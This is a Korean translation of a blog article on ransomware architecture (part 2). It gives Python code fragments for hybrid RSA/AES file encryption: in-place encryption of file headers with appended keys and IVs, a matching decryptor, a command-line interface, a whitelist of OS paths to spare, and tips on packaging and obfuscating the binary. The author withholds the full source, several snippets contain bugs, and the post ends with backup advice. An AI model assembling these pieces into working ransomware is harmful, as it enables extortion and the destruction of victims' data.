---
title: "[Translation] Architecture of Ransomware Part 2"
author: idioth
tags: [idioth, malware, ransomware, crypto]
categories: [Translation]
date: 2021-04-25 14:00:00
cc: true
index_img: /2021/04/25/idioth/arch_of_ransomware_part2/Untitled%205.png
---

안녕하세요! idioth입니다. 길고 길었던 중간고사 기간이었습니다. 하지만 제 중간고사 기간은 더 길어서 아직 끝나지 않았네요. 시험 하나와 대체 과제 3개가 남아있는 삶입니다. 게다가 과목 하나는 양이 너무 많아서 선택과 집중을 했는데 제가 선택한 부분에서 12 문제 중 한 문제 나왔네요. 10점 밑으로 받을 것 같습니다. 하하하하하하하하하하

![](arch_of_ransomware_part2/Untitled.png)

이미 지나간 일 후회하지 않겠습니다... 기말 때 더 잘하면 되니까요^^. 잡담이 길었습니다. 오늘은 저번 게시글에 이어서 파트 2를 진행하도록 하겠습니다!



이전 게시글 보러가기: [[Translation] Architecture of Ransomware Part 1](https://hackyboiz.github.io/2021/04/11/idioth/arch_of_ransomware_part1/)

---



> 원문 글 : [Architecture of a ransomware (2/2)](https://infosecwriteups.com/architecture-of-a-ransomware-2-2-e22d8eb11cee)



[Part 1](https://hackyboiz.github.io/2021/04/11/idioth/arch_of_ransomware_part1/)에서 랜섬웨어가 효과적으로 동작하는데 필요한 주요한 개념에 대해서 설명했다. 이번 파트에서 파이썬 코드를 통해 개념들을 보여줄 것이다. 또한 암호화를 위한 pycryptodome 파이썬 라이브러리의 기본적인 사용법도 다룰 것이다. 스크립트 키디들이 악용할 수 없도록 전체 소스 코드를 올리진 않을 것이다. 이 게시글의 목적은 악성 행위에 사용하라는 것이 아니라 랜섬웨어 악성코드에 대한 지식을 공유하는 것이다.



# 일반적인 고려 사항

여러 개의 오픈 소스 랜섬웨어가 존재하며 랜섬웨어 개발에 관해서 찾아보다가 [Tarcísio Marinho](https://medium.com/u/ea2f2c25847b?source=post_page-----e22d8eb11cee--------------------------------)가 개발한 [GonnaCry](https://github.com/tarcisio-marinho/GonnaCry)라는 랜섬웨어를 발견했다. 코드가 매우 분명하며 읽어 보는 것을 추천한다.

그의 랜섬웨어는 "management side"를 위한 모든 코드가 포함되어 있다. 그는 복호화 키를 관리하고 감염된 클라이언트와 통신하는 해커 측 서버를 코딩했다.

필자는 랜섬웨어가 어떻게 동작하는지 배우기 위해 모든 코드를 작성하였고, 실제 랜섬웨어는 이 부분을 모두 다르게 처리하므로 해당 부분은 다루고 싶지 않았다. payment를 등록하고 복호화 키를 전송하는 자동화 서비스, victim과 직접 상호작용하는 토르 이메일 주소, 몇 개의 샘플 파일을 통해 복호화할 수 있는지 확인하는 시스템 등이 있을 수도 있다. 이 부분은 캠페인마다 달라서 다루지 않을 것이다. 나는 클라이언트 감염 측면에 주로 포커스를 맞출 것이다.



# 언어 선택

필자는 몇 가지 이유로 파이썬을 선택했다. 주요한 이유는 ㄹㅇ 읽기 쉽고 이해하기 쉬우니까.

![](arch_of_ransomware_part2/Untitled%201.png)

`os.system`으로 호출된 OS별 명령어를 사용하지 않으면 크로스 플랫폼 또한 가능하다. 또한 속도가 빠르고 암호화를 위한 라이브러리가 있다. 마지막으로 컴파일된 코드 난독화가 가능하여 리버싱하기 어렵게 만들 수 있다.

파이썬 라이브러리를 선택할 때 동일한 기능을 하는 걸 여러 개 찾아라. 각각의 것을 연구하고 가장 많이 사용되는 것을 선택하는 것은 암호화처럼 빠르게 변화하는 것에 대해서 좋은 접근 방식이다. 오래된 라이브러리를 사용하거나 [Lockcrypt](https://blog.malwarebytes.com/threat-analysis/2018/04/lockcrypt-ransomware/)처럼 자체 개발한 암호화를 사용(하지 마)하면 랜섬웨어가 복호화될 수도 있다.  우리는 잘 알려진 라이브러리 [pycryptodome](https://pypi.org/project/pycryptodome/)과 [secrets](https://docs.python.org/3/library/secrets.html)를 사용할 것이다.

> Note: 실제로 비대칭+대칭 암호화를 결합한 wrapper가 있지만 개념을 설명하기 위해 pycryptodome을 사용해 각 기능을 구현할 것이다.

![](arch_of_ransomware_part2/Untitled%202.png)

# 필요한 기능 요약

- `generate32ByteKey()`: 랜덤한 32바이트 키를 생성한다. 이를 수행하기 위한 여러 가지 방법이 있다. `/dev/urandom`에서 문자열을 긁어와서 `sha256sum`을 하면 되지만 리눅스에 한정적이며 크로스 플랫폼으로 만들고 싶으므로 secrets 라이브러리를 사용할 것이다. `secrets.token_hex(32)`를 통해 수행할 수 있다.
- `rsaEncryptSecret(string, publicKey)`: public key를 가지고 secret을 비대칭 암호화한다(private key를 통해서만 복호화됨). 이렇게 하면 각 파일에 대해 생성된 대칭 키를 publicKey로 암호화할 수 있다. 클라이언트는 각 파일의 대칭 키를 복호화하려면 우리의 private key가 필요하다.
- `rsaDecryptSecret(secret, privateKey)`: private 비대칭 키를 통해 암호화된 대칭키를 복호화한다.
- `symEncryptFile(publicKey, file)`: 암호화 로직을 포함하므로 가장 복잡한 부분이다. 아래에 자세히 설명할 거지만, 이름으로 볼 수 있듯이 파일을 암호화하는 함수다.
- `symDecryptFile(privateKey, file)`: 파일을 복호화한다.
- `symEncryptDirectory(publicKey, dir)`: 파라미터로 디렉터리를 받아서 내부에 있는 모든 파일을 가져온다. 그 후 `symEncryptFile`를 호출한다.
- `symDecryptDirectory(privateKey, dir)`: `symEncryptDirectory`와 비슷하지만 반대의 기능을 한다.



# rsaEncryptSecret

RSA를 통해 secret key를 암호화할 것이다. RSA는 기본적으로 랜덤성 없이 암호화 되므로 기본적인 RSA에 랜덤성과 [one-way permutation trapdoor](https://en.wikipedia.org/wiki/Trapdoor_function)를 추가한 padding scheme인 [Optimal asymmetric encryption padding(OAEP)](https://en.wikipedia.org/wiki/Optimal_asymmetric_encryption_padding)를 사용할 것이다. OAEP와 같이 RSA를 사용할 때 결과 cypher 크기는 modulus(`key size/8`)과 같아야 한다. 2048bit RSA를 사용하므로 256 bytes의 resulting cyphertext가 나와야 한다.

이에 대한 간단한 예제 코드이다.

```python
def rsaEncryptSecret(string, publicKey):
	  public_key = get_key(publicKey, None)
	  # Create the cipher object
	  cipher_rsa = PKCS1_OAEP.new(public_key)
	  # We need to encode the string to work with bytes instead of chars
	  bytestrings = str.encode(string)
	  cipher_text = cipher_rsa.encrypt(bytestrings)
	  #At this point the cipher_text should be 256 bytes in length
	  # We'll base64 encode it for convenience
	  # Remember that a base64 string needs to be divisible by 3, so 256 bytes will become 258 with padding 
	  return base64.b64encode(cipher_text)
```

![](arch_of_ransomware_part2/Untitled%203.png)

Source: [https://stackoverflow.com/questions/13378815/base64-length-calculation](https://stackoverflow.com/questions/13378815/base64-length-calculation)



# RsaDecryptSecret

제공된 secret key로 cipher text를 복호화한다.

```python
def rsaDecryptSecret(string, privateKey):
	  # We firts import the private Key
	  private_key = get_key(privateKey, None)
	  # Decode the base64 encoded string
	  base64DecodedSecret = base64.b64decode(string)
	  # create the cipher object
	  cipher_rsa = PKCS1_OAEP.new(private_key)
	  # Decrypt the content
	  decryptedBytestrings = cipher_rsa.decrypt(base64DecodedSecret)
	  # Remember to convert the decoded cipher from bytes to string
	  decryptedSecret = decryptedBytestrings.decode()
	  return decryptedSecret
```



# SymEncryptFile

주요 암호화 함수이며 다음과 같이 동작한다.

1. publicKey와 file path를 파라미터로 함수를 호출한다.

    ```python
    def symEncryptFile(publicKey, file):
    ```

2. 특정 파일에 대한 랜덤 키를 생성한다.

    ```python
    key = generateKey()
    ```

3. publicKey로 랜덤 키를 암호화한다.

    ```python
    encryptedKey = rsaEncryptSecret(key, publicKey)
    ```

4. 파일에 대한 암호화 사이즈(n byte)를 정의한다. 예시로 1MB를 사용한다.

    ```python
    buffer_size = 1048576
    ```

5. 파일이 이미 암호화되었는지 확인한다. 이미 되어있을 경우 무시한다.

    ```python
    if file.endswitch("." + cryptoName):
    		print('File is already encrypted, skipping')
    		return
    ```

6. 파일의 첫 n 바이트를 암호화하고 content를 overwrite 한다.

    ```python
    # Open the input and output files
    		input_file = open(file, 'r+b')
    		print("Encrypting file: "+ file)
    		output_file = open(file + '.' + cryptoName, 'w+b')

    # Create the cipher object and encrypt the data
    		cipher_encrypt = AES.new(key, AES.MODE_CFB)

    # Encrypt file first
    		input_file.seek(0)
    		buffer = input_file.read(buffer_size)
    		ciphered_bytes = cipher_encrypt.encrypt(buffer)

    input_file.seek(0)
    input_file.write(ciphered_bytes)
    ```

    ![](arch_of_ransomware_part2/Untitled%204.png)

7. 파일의 끝에 암호화된 랜덤 키를 추가한다.

    ```python
    input_file.seek(0, os.SEEK_END)
    input_file.write(encryptedKey.encode())
    ```

8. 파일의 끝에 AES IV(initialization vector)를 추가한다.

    ```python
    input_file.seek(0, os.SEEK_END)
    input_file.write(cipher_encrypt.iv)
    ```

9. 암호화가 된 지 식별할 수 있도록 이름을 바꾼다.

    ```python
    input_file.close()
      os.rename(file, file + "." + cryptoName)
    ```

![](arch_of_ransomware_part2/Untitled%205.png)

> 암호화 후 대략적인 파일 구조

전체 파일을 복사할 필요가 없었던 것을 생각해라. file object를 통해 `seek()` 메소드를 사용하여 바이트를 탐색하고 빠르게 작업을 진행할 수 있다. 이는 복호화 함수에서도 사용된다.

또 암호화된 파일에 AES IV와 암호화된 키를 모두 추가하기 때문에 각 파일에 대한 키가 존재하는 텍스트 파일은 필요 없다. victim은 우리에게 어떤 파일이든 보낼 수 있고 특정한 바이너리에서 사용되는 private key를 가지고 있으면 우리는 복호화할 수 있다.

![](arch_of_ransomware_part2/Untitled%206.png)

# SymDecryptFile

주요 복호화 함수이며 다음과 같이 동작한다.

1. privateKey와 file path를 파라미터로 함수를 호출한다.

    ```python
    def symDecryptFile(privateKey, file):
    ```

2. 파일에 대한 decryption size(n 바이트, 암호화에서 쓴 것과 동일)를 정의해라. 예시는 1MB이다.

    ```python
    buffer_size = 1048576
    ```

3. 확장자를 통해 암호화 여부를 확인한다.

    ```python
    if file.endswith("." + cryptoName):
    		out_filename = file[:-(len(cryptoName) + 1)]
    		print("Decrypting file: " + file)
    else :
    	print('File is not encrypted')
    	return
    ```

4. 파일을 열어 AES IV(마지막 16바이트)를 읽어온다.

    ```python
    input_file = open(file, 'r+b')

    # Read in the iv
    input_file.seek(-16, os.SEEK_END)
    iv = input_file.read(16)
    ```

5. 암호화된 복호화 키를 읽어온다.

    ```python
    # we move the pointer to 274 bbytes before the end of file
    # (258 bytes of the encryption key + 16 of the AES IV)
    input_file.seek(-274, os.SEEK_END)

    # And we read the 258 bytes of the key
    secret = input_file.read(258)
    ```

6. private key를 가지고 암호화된 키를 복호화한다.

    ```python
    key = rsaDecryptSecret(cert, secret)
    ```

7. 이전에 정의한 aes-encrypted buffer size를 복호화하고 파일의 첫 부분에 작성한다.

    ```python
    # Create the cipher object
    cipher_encrypt = AES.new(privateKey, AES.MODE_CFB, iv=iv)

    # Read the encrypted header
    input_file.seek(0)
    buffer = input_file.read(buffer_size)

    # Decrypt the header with the key
    decrypted_bytes = cipher_encrypt.decrypt(buffer)

    # Write the decrypted text on the same file
    input_file.seek(0)
    input_file.write(decrypted_bytes)
    ```

8. 파일의 끝 부분에서 IV와 암호화된 키를 제거하고 이름을 변경한다.

    ```python
    # Delete the last 274 bytes from IV + key.
    input_file.seek(-274, os.SEEK_END)
    input_file.truncate()
    input_file.close()

    # Rename the file to delete the encrypted extenstion
    os.rename(file, out_filename)
    ```



# 마지막 고려사항

모든 함수 작성이 끝나면 선택한 폴더를 암호화하거나 복호화할 수 있는 바이너리를 만들 수 있다. 정확하게 `symEncryptDirectory/symDecryptDirectory` 함수를 코딩했으면 암호화, 복호화 중 하나를 선택한 후 `.pem` 파일을 전달하기만 하면 된다. main 호출 전에 바이너리에 이것과 비슷한 것이 있을 것이다

```python
parser = argparse.ArgumentParser()
parser.add_argument("--dest", "-d", help="File or directory to encrypt/decrypt", dest="destination", default="none", required=True)
parser.add_argument("--action", "-a", help="Action (encrypt/decrypt)", dest="action", required=True)
 
parser.add_argument("--pem","-p", help="Public/Private key", dest="key", required=True)
```

오류 검사(암호화 작업에 파라미터로 public key가 전달되는지, decrypt에 private key가 있는지 등) 외에도 운영 체제에 대한 파일 및 폴더를 화이트 리스트로 지정해야 한다. 암호화되더라도 컴퓨터는 사용이 가능하도록 해야 한다. 모든 파일을 암호화한다면 다음과 같은 결과를 볼 수 있다.

1. 사용자가 뭔가 잘못된 걸 알 수 있도록 컴퓨터 사용이 불가능해진다.
2. 전부 암호화된 후, 시스템이 부팅이 안되고 사용자는 랜섬웨어에 감염된 사실을 알지 못한다.

예시로 리눅스 화이트 리스트는 다음과 같다.

```
whitelist = ["/etc/ssh", "/etc/pam.d", "/etc/security/", "/boot",
"/run", "/usr", "/snap", "/var", "/sys", "/proc", "/dev", "/bin",
"/sbin", "/lib", "passwd", "shadow", "known_hosts", "sshd_config",
"/home/sec/.viminfo", '/etc/crontab', "/etc/default/locale", "/etc/environment"]
```

`.py` 스크립트를 모든 dependency와 함께 압축하여 단일 실행 파일로 만들 수 있다. 일일이 알려주진 않겠지만 [pyarmor](https://pypi.org/project/pyarmor/)와 [pyinstaller](https://www.pyinstaller.org/)를 찾아보면 된다. 또 사용하려는 난독화에 따라서 [Nuitka](https://github.com/Nuitka/Nuitka)가 도움이 될 수도 있다.



# 다른 종류의 랜섬웨어(MBR 암호화)

우리가 살펴보지 않은 드라이브의 [Master Boot Record](https://en.wikipedia.org/wiki/Master_boot_record)를 감염시키는 다른 종류의 랜섬웨어가 있다. 파일 시스템의 NTFS 파일 테이블을 암호화하는 페이로드를 실행하여 디스크를 사용할 수 없게 만든다. 이 방법은 데이터의 작은 부분만 암호화하면 돼서 매우 빠르다. [Petya 랜섬웨어](https://en.wikipedia.org/wiki/Petya_(malware))가 이 종류의 완벽한 예시이다. 하지만 이는 3개의 주요한 단점을 가지고 있다.

첫 번째로 OS를 부팅할 수 없어도 포렌식 분석을 통해 파일을 복구할 수 있다. 파일들은 삭제되지 않고 파일 테이블에서 참조되지 않을 될 뿐이다. 컴퓨터가 재부팅 된 후에 raw data를 암호화 하더라도 victim이 컴퓨터를 끄고 디스크를 빼버리면 일부 파일을 복구할 수 있다.

두 번째 단점은 대부분 [최신 OS는 GPT(GUID Partition Table)을 사용하여 MBR을 더 이상 쓰지 않는다](https://www.howtogeek.com/193669/whats-the-difference-between-gpt-and-mbr-when-partitioning-a-drive/)는 것이다.

세 번째 단점은 파일 시스템 의존성이 높고 NTFS처럼 동작하지 않는 파일 시스템(EXT3/EXT4, ZFS 등)도 고려하기 위해 수정해야 한다는 점이다.

이 방법은 더 많은 low-level technical concept을 요구하여 이 게시글에서 많이 설명하고 싶지 않다. 또한 이 방법론은 많이 사용되지 않는다. 필자의 주목적은 일반적인 랜섬웨어에 대해 독자들이 더 잘 이해할 수 있도록 하는 것이다.



# 결론

랜섬웨어를 방지하는 방법들(출처를 알 수 없는 파일 열지 말기, 인프라 업데이트 유지, 안티 멀웨어 소프트웨어 사용하기 등등) 외에도 추천하는 방법은 백업과 백업 그리고 또 백업이다. 공격을 막기 위한 많은 조언을 듣게 되겠지만 필자의 생각에는 그냥 걸릴 거라 생각하고 데이터를 오프라인 백업하는 것이다.

![](arch_of_ransomware_part2/Untitled%207.png)

당신이 감염을 피한다 해도 동료 직원이 걸리면 매핑된 공유 드라이브의 모든 파일이 암호화 될 것이다.

> 마지막으로 아무도 추천하지 않은 방법: 감염된 경우, 암호화된 파일(가족사진, 비디오 등)을 바로 복구할 필요가 없으면 암호화된 파일의 복사본을 보관해라. 멀웨어 개발자가 은퇴(Shade, TeslaCrypt, HildaCrypt)하거나 체포(CoinVault)되거나 경쟁자의 키를 배포(Petya vs Chimera)하는 등 해독 키가 공개될 수 있다. 운 좋으면 몇 달 안에 복구할 수 있다.